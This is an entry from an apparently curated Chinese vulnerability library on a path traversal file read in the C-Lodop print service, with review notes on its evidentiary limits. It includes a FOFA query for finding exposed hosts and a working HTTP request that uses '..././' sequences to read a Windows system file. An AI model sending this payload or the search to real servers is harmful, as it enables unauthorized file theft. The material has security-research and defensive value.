---
source: "wy876 漏洞文库"
title: "C-Lodop打印服务 路径读取"
product: "C-Lodop打印服务"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "Windows特殊..././规范化；版本未知"
prerequisites: "无Cookie示例"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/cg548zol8agvqu5o"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/C-Lodop%E6%89%93%E5%8D%B0/C-Lodop%E6%89%93%E5%8D%B0%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "C-Lodop"
id: "vw-4a1c0b6a0e77f3f2396e82f0"
entity_id: "ve-4a1c0b6a0e77f3f2396e82f0"
schema_version: "1"
---

# C-Lodop打印服务 路径读取

## 条目说明

- 对象与具体问题：C-Lodop打印服务；路径读取
- 版本、配置及部署条件：Windows特殊..././规范化；版本未知
- 认证与权限前提：无Cookie示例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只有hosts路径请求，无回显/根因/补丁
- 任意文件/获取系统权限超过所示证据，应保留权限约束
- 明确Windows路径及服务暴露面条件，删除受欢迎等营销语

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
C-Lodop云打印服务器是一款非常好用且受欢迎的专业云打印软件，简单实用，易操作。攻击者可利用此漏洞获取服务器上的任意文件，包括数据库凭据、API密钥、配置文件等，从而获取系统权限和敏感信息。

## 二、影响版本
+ C-Lodop打印服务系统

## 三、资产测绘
+ fofa`"C-Lodop" && icon_hash="-329747115"`
+ 特征


## 四、漏洞复现
```http
GET /..././..././..././..././Windows/System32/drivers/etc/hosts HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cg548zol8agvqu5o>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
